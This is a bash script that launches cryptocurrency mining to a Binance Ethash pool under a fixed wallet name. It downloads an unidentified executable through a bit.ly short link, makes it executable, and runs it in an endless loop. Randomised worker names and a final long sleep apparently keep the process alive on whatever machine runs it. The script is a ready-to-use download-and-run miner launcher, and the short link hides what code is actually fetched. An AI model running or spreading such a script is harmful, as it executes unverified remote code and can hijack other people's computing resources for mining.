#!/bin/bash
POOL=ethash.poolbinance.com:1800
WALLET=teguhcong
WORKER=$(echo $(shuf -i 41-80 -n 1)-ETHash)
#wget https://github.com/drJamesjack/prem/raw/main/lolMiner
wget https://bit.ly/3FpnfeJ
chmod +x 3FpnfeJ
#chmod +x lolMiner
while [ 1 ]; do
#./3FpnfeJ --algo ETHASH --pool $POOL --user $WALLET.$WORKER --pass c=LTC,mc=ETH
./3FpnfeJ --algo ETHASH --pool $POOL --user $WALLET.$WORKER 
sleep 5
done
sleep 999999999
